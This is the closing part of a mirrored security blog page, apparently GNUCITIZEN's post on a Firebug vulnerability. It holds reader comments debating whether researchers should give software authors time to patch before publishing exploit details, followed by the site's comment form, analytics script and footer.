+		<img alt='' src='http://1.gravatar.com/avatar/f9fd29cf7c9236ba5fb939520280e6a9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">James</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123115">
+			July 28, 2008 at 3:39 pm</a>		</div>
+
+		<p>Thor,</p>
+<p>I don&#8217;t think anyone here is saying you should bury the research. We all know that security through obscurity is a fallacy. However, asking you to delay publishing an exploit for a day or two is certainly not unreasonable. It helps protect the users more than the author.</p>
+<p>Premature publishing of explicit exploit information is one of the ways that &#8220;zero-day&#8221; problems become widespread. As a user of Firebug I&#8217;d rather you had talked to Joe first. Actually as a user of any software I&#8217;d rather you give it&#8217;s author a chance to patch before publishing exploits.</p>
+<p>If you feel you must post immediately, post the information that the vulnerability exists and some basic details without the full &#8220;how-to&#8221; and follow up later with the full disclosure.</p>
+<p>There are certainly times where it&#8217;s appropriate to use disclosure as a means to force action, but give the author a reasonable chance to respond. It&#8217;s better for all of us.</p>
+<p>James.</p>
+<p>Previously Thor Larholm said:</p>
+<blockquote><p>I don&#8217;t think there is anything extreme about publishing a vulnerability when you find it. sure, Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately, but I fail to see how that is my concern. In that regards I have treated him no worse or better than I have treated Microsoft, Mozilla or Valve in the past.</p>
+<p>This is research that pdp and I have independently performed. We&#8217;re not employees of Microsoft or Firebug, instead we are altruistically researching and publishing the very things that others are also researching &#8211; but keeping private.</p></blockquote>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128018">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7ecda5296862220b8eb6db6adad3ade9?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://outlawreviews.com/' rel='external nofollow' class='url'>Outlaw Reviews</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128018">
+			November 30, 2009 at 7:47 am</a>		</div>
+
+		<p>Yes I think you should inform the owner before you publish or you are just contributing to the problem. So that would make you just as guilty as the people causing all the problems on the net today. But on the other hand its people like you all that help keep the net safe just be responsable with your powers are you doing it for good or evil.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="191"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="33ed7d07f7" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/firebug-goes-evil/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:20:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
